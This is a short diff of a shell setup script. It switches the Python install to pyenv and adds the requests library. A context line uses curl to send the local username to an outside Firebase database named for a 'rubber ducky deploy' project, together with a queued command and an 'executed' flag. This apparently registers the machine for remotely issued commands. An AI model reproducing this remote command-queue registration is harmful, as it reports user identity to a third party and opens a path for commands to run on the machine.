@@ -16,7 +16,11 @@ install_brew() {
 # install_brew
 
 # for funsies
-brew install python@3.13
+brew install pyenv
+pyenv install 3.13
+
+# cus it dont come with python
+pip3 install requests
 
 # add user
 curl -X PATCH -d "{ \"$USER\": { \"commands\":[\"say hello\"], \"executed\":false }}" https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/users.json
